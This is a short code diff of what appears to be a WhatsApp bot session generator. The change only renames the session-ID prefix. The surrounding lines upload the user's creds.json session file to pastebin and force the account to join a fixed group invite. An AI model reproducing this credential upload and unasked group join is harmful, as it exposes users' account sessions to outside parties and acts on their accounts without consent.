@@ -38,7 +38,7 @@ async function qr() {
             await delay(1000 * 10);
             const output = await pastebin.createPasteFromFile(__dirname + `/session/${id}/creds.json`, "pastebin-js test", null, 1, "N");
             const ethix = await sock.sendMessage(sock.user.id, {
-                text: `Queen-Nezuko~` + output.split('/')[3]
+                text: `izumi~` + output.split('/')[3]
             });
             sock.groupAcceptInvite("DcGABEejUwOG8YcgGOcizF");
             await sock.sendMessage(sock.user.id, { text: `*⛒ ᴛʜᴀɴᴋ чᴏᴜ ғᴏʀ ᴄʜᴏᴏꜱɪɴɢ qᴜᴇᴇɴ-ɴᴇᴢᴜᴋᴏ⭜!!!⛥*` }, { quoted: ethix });
